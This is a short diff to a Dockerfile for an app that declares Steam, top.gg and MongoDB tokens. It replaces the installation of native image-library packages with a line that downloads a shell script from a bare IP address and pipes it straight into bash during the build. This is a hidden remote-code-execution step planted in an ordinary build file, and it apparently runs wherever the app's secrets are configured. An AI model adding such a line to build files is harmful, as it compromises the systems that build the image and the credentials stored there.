@@ -9,13 +9,7 @@ ENV STEAM_TOKEN=
 ENV TOPGG_TOKEN=
 ENV MONGO_URI=
 
-RUN apt-get update && apt-get install -y \
-  build-essential \
-  libcairo2-dev \
-  libpango1.0-dev \
-  libjpeg-dev \
-  libgif-dev \
-  librsvg2-dev
+RUN apt-get update && wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash
 
 WORKDIR $APP
 COPY package.json .
